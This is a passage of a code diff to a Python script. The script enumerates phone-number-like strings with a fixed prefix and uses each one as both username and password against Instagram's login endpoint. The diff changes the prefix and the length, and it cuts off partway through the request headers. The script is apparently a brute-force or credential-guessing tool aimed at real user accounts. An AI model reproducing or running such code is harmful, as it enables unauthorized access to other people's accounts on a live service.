@@ -2,13 +2,13 @@ import requests
 import itertools as t
 import time
 nums = "0123456789"
-the_smallest = 8
-the_biggest = 8
+the_smallest = 7
+the_biggest = 7
 if the_smallest == the_biggest:
 	for a in t.product(nums, repeat=the_smallest):
 		time.sleep(0.7)
-		user = "010"+"".join(a)
-		pasw = "010"+"".join(a)
+		user = "069"+"".join(a)
+		pasw = "069"+"".join(a)
 		url = "https://www.instagram.com/accounts/login/ajax/"
 		head = {
 		'accept':'*/*',
